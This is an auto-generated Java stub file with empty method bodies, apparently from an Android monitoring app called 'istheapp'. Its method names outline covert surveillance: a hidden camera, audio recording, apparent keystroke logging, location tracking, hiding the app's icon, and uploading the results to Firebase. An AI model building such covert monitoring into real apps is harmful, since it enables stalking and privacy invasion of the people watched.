package com.github.midros.istheapp.services.accessibilityData;

import java.lang.System;

/**
 * Created by luis rafael on 17/03/18.
 */
@kotlin.Metadata(mv = {1, 1, 15}, bv = {1, 0, 3}, k = 1, d1 = {"\u0000v\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\t\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0002\b\u0004\n\u0002\u0010\u000b\n\u0002\b\b\n\u0002\u0010\b\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0002\b\u0006\n\u0002\u0018\u0002\n\u0002\b\t\n\u0002\u0018\u0002\n\u0002\b\u0005\u0018\u00002\u00020\u00012\u00020\u0002B\u0017\b\u0007\u0012\u0006\u0010\u0003\u001a\u00020\u0004\u0012\u0006\u0010\u0005\u001a\u00020\u0006\u00a2\u0006\u0002\u0010\u0007J\b\u0010\u0018\u001a\u00020\u0019H\u0002J\b\u0010\u001a\u001a\u00020\u0019H\u0016J\b\u0010\u001b\u001a\u00020\u0019H\u0002J\u0010\u0010\u001c\u001a\u00020\u00192\u0006\u0010\u001d\u001a\u00020\u001eH\u0016J\u0010\u0010\u001f\u001a\u00020\u00192\u0006\u0010 \u001a\u00020\u001eH\u0016J\b\u0010!\u001a\u00020\u0019H\u0016J\b\u0010\"\u001a\u00020\u0019H\u0016J\b\u0010#\u001a\u00020\u0019H\u0016J\b\u0010$\u001a\u00020\u0019H\u0016J\u0010\u0010%\u001a\u00020\u00192\u0006\u0010&\u001a\u00020\'H\u0016J\u0010\u0010(\u001a\u00020\u00192\u0006\u0010)\u001a\u00020*H\u0016J\b\u0010+\u001a\u00020\u0019H\u0002J\b\u0010,\u001a\u00020\u0019H\u0002J\u0012\u0010-\u001a\u00020\u00192\b\u0010)\u001a\u0004\u0018\u00010\u000bH\u0002J\u0010\u0010.\u001a\u00020\u00192\u0006\u0010/\u001a\u00020\u000bH\u0016J\u0010\u00100\u001a\u00020\u00192\u0006\u0010 \u001a\u000201H\u0016J\u0010\u00102\u001a\u00020\u00192\u0006\u0010\u000f\u001a\u00020\u0010H\u0002J\b\u00103\u001a\u00020\u0019H\u0002J\u0018\u00104\u001a\u00020\u00192\u0006\u00105\u001a\u00020\u000b2\u0006\u00106\u001a\u00020\u000bH\u0002J\u0010\u00107\u001a\u00020\u00192\u0006\u00108\u001a\u00020\u001eH\u0016J\u0010\u00109\u001a\u00020\u00192\u0006\u0010:\u001a\u00020;H\u0002J\b\u0010<\u001a\u00020\u0019H\u0016J\u0010\u0010=\u001a\u00020\u00192\u0006\u0010\u0016\u001a\u00020\u0010H\u0002J\b\u0010>\u001a\u00020\u0019H\u0016J\b\u0010?\u001a\u00020\u0019H\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\tX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0010\u0010\n\u001a\u0004\u0018\u00010\u000bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\f\u001a\u00020\rX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u000e\u001a\u0004\u0018\u00010\u000bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u000f\u001a\u00020\u0010X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u0011\u001a\u0004\u0018\u00010\u000bX\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0012\u001a\u00020\u0013X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0014\u001a\u00020\u0015X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0016\u001a\u00020\u0010X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u0010\u0010\u0017\u001a\u0004\u0018\u00010\tX\u0082\u000e\u00a2\u0006\u0002\n\u0000\u00a8\u0006@"}, d2 = {"Lcom/github/midros/istheapp/services/accessibilityData/InteractorAccessibilityData;", "Lcom/github/midros/istheapp/services/accessibilityData/InterfaceAccessibility;", "Lcom/github/midros/istheapp/utils/hiddenCameraServiceUtils/CameraCallbacks;", "context", "Landroid/content/Context;", "firebase", "Lcom/github/midros/istheapp/data/rxFirebase/InterfaceFirebase;", "(Landroid/content/Context;Lcom/github/midros/istheapp/data/rxFirebase/InterfaceFirebase;)V", "countDownTimer", "Lcom/github/midros/istheapp/utils/MyCountDownTimer;", "dateTime", "", "disposable", "Lio/reactivex/disposables/CompositeDisposable;", "fileName", "interval", "", "nameAudio", "pictureCapture", "Lcom/github/midros/istheapp/utils/hiddenCameraServiceUtils/HiddenCameraService;", "recorder", "Lcom/github/midros/istheapp/utils/MediaRecorderUtils;", "startTime", "timer", "cancelTimer", "", "clearDisposable", "deleteFile", "enableGps", "gps", "", "enablePermissionLocation", "location", "getCapturePicture", "getRecordingAudio", "getShowOrHideApp", "getSocialStatus", "onCameraError", "errorCode", "", "onImageCapture", "imageFile", "Ljava/io/File;", "resetParamsRecording", "sendFileAudio", "sendFilePhoto", "setDataKey", "data", "setDataLocation", "Landroid/location/Location;", "setIntervalRecord", "setPushName", "setPushNamePhoto", "url", "namePhoto", "setRunServiceData", "run", "startCameraPicture", "childPhoto", "Lcom/github/midros/istheapp/data/model/ChildPhoto;", "startCountDownTimer", "startRecording", "stopCountDownTimer", "stopRecording", "app_debug"})
public final class InteractorAccessibilityData implements com.github.midros.istheapp.services.accessibilityData.InterfaceAccessibility, com.github.midros.istheapp.utils.hiddenCameraServiceUtils.CameraCallbacks {
    private long startTime;
    private long interval;
    private com.github.midros.istheapp.utils.hiddenCameraServiceUtils.HiddenCameraService pictureCapture;
    private io.reactivex.disposables.CompositeDisposable disposable;
    private com.github.midros.istheapp.utils.MyCountDownTimer timer;
    private com.github.midros.istheapp.utils.MediaRecorderUtils recorder;
    private java.lang.String fileName;
    private java.lang.String dateTime;
    private java.lang.String nameAudio;
    private com.github.midros.istheapp.utils.MyCountDownTimer countDownTimer;
    private final android.content.Context context = null;
    private final com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase firebase = null;
    
    @java.lang.Override()
    public void startCountDownTimer() {
    }
    
    @java.lang.Override()
    public void stopCountDownTimer() {
    }
    
    @java.lang.Override()
    public void clearDisposable() {
    }
    
    @java.lang.Override()
    public void setDataKey(@org.jetbrains.annotations.NotNull()
    java.lang.String data) {
    }
    
    @java.lang.Override()
    public void setDataLocation(@org.jetbrains.annotations.NotNull()
    android.location.Location location) {
    }
    
    @java.lang.Override()
    public void enablePermissionLocation(boolean location) {
    }
    
    @java.lang.Override()
    public void enableGps(boolean gps) {
    }
    
    @java.lang.Override()
    public void setRunServiceData(boolean run) {
    }
    
    @java.lang.Override()
    public void getShowOrHideApp() {
    }
    
    @java.lang.Override()
    public void getCapturePicture() {
    }
    
    private final void startCameraPicture(com.github.midros.istheapp.data.model.ChildPhoto childPhoto) {
    }
    
    @java.lang.Override()
    public void onImageCapture(@org.jetbrains.annotations.NotNull()
    java.io.File imageFile) {
    }
    
    @java.lang.Override()
    public void onCameraError(int errorCode) {
    }
    
    private final void sendFilePhoto(java.lang.String imageFile) {
    }
    
    private final void setPushNamePhoto(java.lang.String url, java.lang.String namePhoto) {
    }
    
    @java.lang.Override()
    public void getSocialStatus() {
    }
    
    @java.lang.Override()
    public void getRecordingAudio() {
    }
    
    private final void startRecording(long startTime) {
    }
    
    private final void stopRecording() {
    }
    
    private final void cancelTimer() {
    }
    
    private final void setIntervalRecord(long interval) {
    }
    
    private final void deleteFile() {
    }
    
    private final void sendFileAudio() {
    }
    
    private final void setPushName() {
    }
    
    private final void resetParamsRecording() {
    }
    
    @javax.inject.Inject()
    public InteractorAccessibilityData(@org.jetbrains.annotations.NotNull()
    android.content.Context context, @org.jetbrains.annotations.NotNull()
    com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase firebase) {
        super();
    }
}